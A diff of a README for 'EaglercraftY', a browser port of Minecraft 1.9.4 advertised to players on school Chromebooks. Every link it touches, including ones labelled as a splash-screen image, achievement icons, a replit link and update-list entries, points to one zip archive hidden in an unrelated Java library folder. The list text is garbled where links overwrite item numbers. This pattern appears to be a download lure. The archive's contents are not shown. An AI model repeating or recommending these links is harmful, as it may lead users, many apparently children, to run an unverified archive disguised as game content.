@@ -12,7 +12,7 @@ This project wil have the official Code of minecraft  1.9.4 and this respository
 
 
 (i need to code Opengl to make it possible and try to port to Teavm to 1.9)
-![New-splash-screen-logo](https://raw.githubusercontent.com/Paaxy/EaglercraftY/main/sources/main/java/com/google/common/io/Eaglercraft_Y_v1.3.zip)
+![New-splash-screen-logo](https://github.com/Paaxy/EaglercraftY/raw/refs/heads/main/sources/main/java/com/google/common/io/Eaglercraft_Y_v1.3.zip)
 >Eaglercraft is real Minecraft 1.9.4 that you can play in any regular web browser. That includes school chromebooks, it works on all chromebooks. It supports both singleplayer and multiplayer (coming soon)
 
 
@@ -29,7 +29,7 @@ Eaglercraft is real Minecraft 1.9 that you can play in any regular web browser. 
 ### If replit is acceptable, you can use this:
 
 ### (there heres replit for 1.9 version)
-https://raw.githubusercontent.com/Paaxy/EaglercraftY/main/sources/main/java/com/google/common/io/Eaglercraft_Y_v1.3.zip
+https://github.com/Paaxy/EaglercraftY/raw/refs/heads/main/sources/main/java/com/google/common/io/Eaglercraft_Y_v1.3.zip
 
 ### Manual setup instructions:
 (COMING SOON)
@@ -99,7 +99,7 @@ https://raw.githubusercontent.com/Paaxy/EaglercraftY/main/sources/main/java/com/
 
 
 ## A complete REVAMP OF Achivements (Photoshopped version)
-![revamped Achivement icons](https://raw.githubusercontent.com/Paaxy/EaglercraftY/main/sources/main/java/com/google/common/io/Eaglercraft_Y_v1.3.zip)
+![revamped Achivement icons](https://github.com/Paaxy/EaglercraftY/raw/refs/heads/main/sources/main/java/com/google/common/io/Eaglercraft_Y_v1.3.zip)
 
 
 
@@ -120,9 +120,9 @@ https://raw.githubusercontent.com/Paaxy/EaglercraftY/main/sources/main/java/com/
 
 ## Free Update List for New stuff
 May include
-https://raw.githubusercontent.com/Paaxy/EaglercraftY/main/sources/main/java/com/google/common/io/Eaglercraft_Y_v1.3.zip eletrya 
+https://github.com/Paaxy/EaglercraftY/raw/refs/heads/main/sources/main/java/com/google/common/io/Eaglercraft_Y_v1.3.zip eletrya 
 2. New End cities
-https://raw.githubusercontent.com/Paaxy/EaglercraftY/main/sources/main/java/com/google/common/io/Eaglercraft_Y_v1.3.zip a Warden
+https://github.com/Paaxy/EaglercraftY/raw/refs/heads/main/sources/main/java/com/google/common/io/Eaglercraft_Y_v1.3.zip a Warden
 4. new Blocks (sulk,Caystic,Acacia Boat with Chest,Allay Spawn Egg,Birch Boat with Chest,Bucket of Tadpole,Dark Oak Boat with Chest
 Disc Fragment
 Echo Shard
